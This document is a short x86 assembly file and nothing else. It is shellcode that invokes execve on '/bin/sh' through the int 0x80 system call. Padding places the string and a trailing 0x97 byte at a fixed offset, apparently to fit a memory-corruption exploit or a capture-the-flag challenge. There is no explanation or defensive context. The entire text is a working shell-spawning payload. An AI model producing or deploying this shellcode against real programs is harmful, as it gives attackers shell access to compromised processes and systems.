.section .text
.global _start

_start:
	nop
	xor	%eax, %eax
	movb $0xb, %al
	movl $path, %ebx
	xor %ecx, %ecx
	mov %ecx, %edx
	int $0x80


. = 61 - 8 - 1 # 61 - len("/bin/sh\x00") - len("\x97")

path:
.ascii "/bin/sh\x00"
xchg   %eax,%edi
